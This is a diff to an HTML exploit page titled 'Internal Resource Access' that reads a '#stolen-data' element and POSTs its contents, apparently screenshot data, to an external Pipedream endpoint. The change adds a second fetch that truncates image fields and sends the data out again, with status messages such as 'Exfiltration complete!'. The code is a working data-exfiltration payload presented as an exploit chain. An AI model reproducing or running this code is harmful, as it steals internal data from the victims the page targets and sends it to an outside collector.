@@ -9,7 +9,7 @@
     </style>
 </head>
 <body>
-    <h1>Internal Resource Access 7</h1> 
+    <h1>Internal Resource Access 8</h1> 
     
     <div class="box">
         <p id="exploit-status">Initializing exploit chain...</p>
@@ -75,13 +75,36 @@
             if (dataDiv && dataDiv.textContent) {
                 appendToDetails("Found stolen-data div, exfiltrating...");
                 
-                fetch('https://eo1b8md42oge0zj.m.pipedream.net', {
+                fetch('https://eo1b8md42oge0zj.m.pipedream.net?pipedream_upload_body=1', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ data: dataDiv.textContent })
                 }).then(() => {
                     document.getElementById('exploit-status').innerText = "Exfiltration complete!";
                     appendToDetails("Data sent to Pipedream.");
+                }).catch(e => appendToDetails("Final exfil error: " + e.message));
+
+                // 2. Truncate the image data if it exists (assuming data is an array of screenshots)
+                let data = JSON.parse(dataDiv.textContent);
+                if (Array.isArray(data)) {
+                    data = data.map(item => {
+                        if (item.image_data && item.image_data.length > 100) {
+                            item.image_data = item.image_data.substring(0, 100) + "...[TRUNCATED]";
+                        }
+                        return item;
+                    });
+                }
+        
+                appendToDetails("Found data, truncating and exfiltrating...");
+        
+                // 3. Send the truncated JSON
+                fetch('https://eo1b8md42oge0zj.m.pipedream.net', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ data: data }) // Use the modified 'data' object
+                }).then(() => {
+                    document.getElementById('exploit-status').innerText = "Exfiltration (truncated) complete!";
+                    appendToDetails("Truncated data sent to Pipedream.");
                 }).catch(e => appendToDetails("Final exfil error: " + e.message));
             } else {
                 appendToDetails("Error: #stolen-data div not found or empty.");
